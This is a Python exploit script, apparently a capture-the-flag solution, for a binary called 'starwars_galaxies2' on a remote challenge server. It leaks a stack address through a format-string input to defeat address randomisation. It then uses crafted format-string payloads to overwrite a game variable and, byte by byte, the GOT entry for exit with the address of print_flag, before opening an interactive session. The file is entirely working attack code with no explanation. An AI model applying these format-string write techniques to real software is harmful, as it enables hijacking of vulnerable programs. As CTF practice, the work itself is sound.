#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./starwars_galaxies2')
host = args.HOST or '0.cloud.chals.io'
port = int(args.PORT or 34916)

gdbscript = '''
# tbreak main
# b *view_player+193
continue
'''.format(**locals())

def createplayer(name, id_):
	sla(b">> ", "0")
	sla(b"Enter your player name: ", name)
	sla(b"Enter your player id number: ", str(id_))
	sla(b"Select your player class: ", b"0")


def viewplayer(id_):
	sla(b">> ", "1")


libc=SetupLibcELF()
io = start()

createplayer(b"%158$p" , 0)
sla(b">> ", b"2")
exe.address=GetInt(rl())[0]-0x10f0
pb()
createplayer(fmtstr_payload(8, {exe.sym.boss:0x61}, write_size='short') , 1)
sla(b">> ", b"2")
target=exe.sym.print_flag
for i in range(8):
	createplayer(b""+fmtstr_payload(8, {exe.got.exit+i:((target & (0xff << i * 8)) >> i * 8)}, write_size='byte') , 0)
	sla(b">> ", b"2")

io.interactive()
